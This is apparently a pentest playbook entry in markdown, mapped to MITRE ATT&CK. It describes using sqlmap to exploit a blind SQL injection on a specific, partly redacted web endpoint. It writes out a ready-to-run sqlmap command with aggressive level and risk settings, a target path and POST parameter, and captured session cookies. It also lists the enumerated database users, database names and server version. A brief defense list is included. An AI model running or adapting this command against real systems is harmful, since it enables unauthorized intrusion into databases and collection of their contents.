---
id: proc-uuid-4
tags:
  - sqli
  - automation
  - enumeration
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-enumerate]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
updated_at: '2025-12-14T03:46:14.964Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
---
# Automate Enumeration with sqlmap

## Summary

This procedure automates blind SQLi exploitation using sqlmap to extract databases, users, privileges, hostname, current DB, and DBA status from the vulnerable endpoint.

## Description

sqlmap detects and exploits the injection point with high level/risk settings, using time/boolean payloads. Includes cookie for session; outputs metadata without full dumps to prove severity.

## Requirements

1. sqlmap installed (Python-based)
2. Captured cookies from Burp
3. Target URL and POST data known

## Defense

Defensive measures and detection strategies:

- Block automated tools via CAPTCHA or IP bans
- Use intrusion detection for sqlmap signatures
- Isolate databases from web apps

## Objectives

1. Enumerate DB structure
2. Identify users and privileges
3. Confirm exploitation feasibility

## Instructions

### Step 1: Run sqlmap Enumeration

**Context**: Target the URL with POST data, enabling aggressive options.

**Command** ([[commands/sqlmap-enumerate]]):
```bash
python sqlmap.py -u "https://████████:443/elist/viewem6.php" --data="rememail=test@att.net" --level=5 --risk=3 --users --dbs -b --hostname --current-db --privileges --is-dba --cookie="v1st=A9532F64A9E711AF;PHPSESSID=1796d85a30d3addf5934c1f0fafec529"
```

> Extracts users ('ntmsender'@'localhost'), dbs (information_schema, mtlist), banner (5.6.36), etc.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[System Information Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-enumerate]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- automation
